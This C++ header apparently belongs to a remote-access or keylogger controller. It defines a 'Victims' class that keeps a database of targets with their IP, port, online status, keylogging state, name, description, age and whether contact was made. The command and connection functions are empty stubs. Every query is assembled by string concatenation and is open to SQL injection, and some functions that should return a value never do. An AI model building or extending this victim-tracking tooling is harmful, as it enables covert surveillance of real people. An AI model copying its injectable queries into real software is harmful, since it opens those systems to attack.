#pragma once
#include "../DataBase/DataBase.h"
#include "../WinNetlib/Single/Single_NetworkHandlerClient.h"

struct vicData
{
	string IP;
	int Port;
	string Name;
	bool Online;
	bool Keylogging;
	string vicName;
	string vicDesc;
	int vicAge;
	bool madeContact;
};

class Victims
{
	DataBase* VictimDB;
	Single_NetworkHandlerClient* Victim;

	Victims(DataBase* vicdb, Single_NetworkHandlerClient* vic, string tblName) {
		VictimDB = vicdb;
		Victim = vic;
		tableName = tblName;
	}

	enum vicDataE
	{
		IP,
		Port,
		Name,
		Online,
		Keylogging,
		vicName,
		vicDesc,
		vicAge,
		madeContact
	};

	vicData selVicdata;

	string tableName;

public:
	//edit/get victim details

	bool AddVictim(vicData vd) {
		return VictimDB->Query("INSERT INTO " + tableName + " VALUES(" + vd.IP + ", " + to_string(vd.Port) + ", " + vd.Name + ", " + to_string(vd.Online) + ", " + to_string(vd.Keylogging) + ", " + vd.vicName + ", " + vd.vicDesc + ", " + to_string(vd.vicAge) + ", " + to_string(vd.madeContact) + ")");
	}

	//bool AddVictim() {

	//}

	bool RemoveVictim(string str, bool isName = true) {
		string q = "";
		if (isName) {
			q = "DELETE FROM " + tableName + " WHERE Name='" + str + "'";
		}
		else {
			q = "DELETE FROM " + tableName + " WHERE IP='" + str + "'";
		}
		if (VictimDB->Query(q)) {
			if (VictimDB->GetRow()) {
				selVicdata.IP = VictimDB->row[0];
				selVicdata.Port = atoi(VictimDB->row[1]);
				selVicdata.Name = VictimDB->row[2];
				selVicdata.Online = VictimDB->row[3];
				selVicdata.Keylogging = VictimDB->row[4];
				selVicdata.vicName = VictimDB->row[5];
				selVicdata.vicDesc = VictimDB->row[6];
				selVicdata.vicAge = atoi(VictimDB->row[7]);
				selVicdata.madeContact = VictimDB->row[8];
				return true;
			}
		}
		return false;
	}

	//if is name is set to false str is registered as an ip
	bool selectVictim(string str, bool isName = true) {
		string q = "";
		if (isName) {
			q = "SELECT * FROM " + tableName + " where Name='" + str + "'";
		}
		else {
			q = "SELECT * FROM " + tableName + " where IP='" + str + "'";
		}
		if (VictimDB->Query(q)) {
			if (VictimDB->GetRow()) {
				selVicdata.IP = VictimDB->row[0];
				selVicdata.Port = atoi(VictimDB->row[1]);
				selVicdata.Name = VictimDB->row[2];
				selVicdata.Online = VictimDB->row[3];
				selVicdata.Keylogging = VictimDB->row[4];
				selVicdata.vicName = VictimDB->row[5];
				selVicdata.vicDesc = VictimDB->row[6];
				selVicdata.vicAge = atoi(VictimDB->row[7]);
				selVicdata.madeContact = VictimDB->row[8];
				return true;
			}
		}
		return false;
	}

	vicData getVicPropertys() {
		return selVicdata;
	}
	template<class T>
	bool setVicProperty(vicDataE vde, T data) {
		switch (vde)
		{
		case Victims::IP:
			return VictimDB->Query("UPDATE " + tableName + " SET IP = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");
			break;
		case Victims::Port:
			return VictimDB->Query("UPDATE " + tableName + " SET Port = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");
			break;
		case Victims::Name:
			return VictimDB->Query("UPDATE " + tableName + " SET Name = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");
			break;
		case Victims::Online:
			return VictimDB->Query("UPDATE " + tableName + " SET Online = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");
			break;
		case Victims::Keylogging:
			return VictimDB->Query("UPDATE " + tableName + " SET Keylogging = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");

			break;
		case Victims::vicName:
			return VictimDB->Query("UPDATE " + tableName + " SET vicName = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");

			break;
		case Victims::vicDesc:
			return VictimDB->Query("UPDATE " + tableName + " SET vicDesc = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");

			break;
		case Victims::vicAge:
			return VictimDB->Query("UPDATE " + tableName + " SET vicAge = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");

			break;
		case Victims::madeContact:
			return VictimDB->Query("UPDATE " + tableName + " SET madeContact = '" + to_string(data) + "'WHERE Name='" + selVicdata.Name + "'; ");

			break;
		default:
			return false;
			break;
		}
	}

	vector<vicData> GetAllVics() {
		vector<vicData> ret;
		vicData vd;
		if (VictimDB->Query("SELECT * FROM victims")) {
			while (VictimDB->GetRow()) {
				vd.IP = VictimDB->row[0];
				vd.Port = atoi(VictimDB->row[1]);
				vd.Name = VictimDB->row[2];
				vd.Online = VictimDB->row[3];
				vd.Keylogging = VictimDB->row[4];
				vd.vicName = VictimDB->row[5];
				vd.vicDesc = VictimDB->row[6];
				vd.vicAge = atoi(VictimDB->row[7]);
				vd.madeContact = VictimDB->row[8];
				ret.push_back(vd);
			}
		}
		return ret;
	}

	//edit/get victim details

	//victim commands

	void MessageVictim() {

	}

	void SendCommandToVictim() {

	}

	void ToggleKeylogger() {

	}

	//victim commands


	//network commands

	bool ConnectToVictim() {

	}

	bool DisconnectFromVictim() {

	}

	//network commands
};

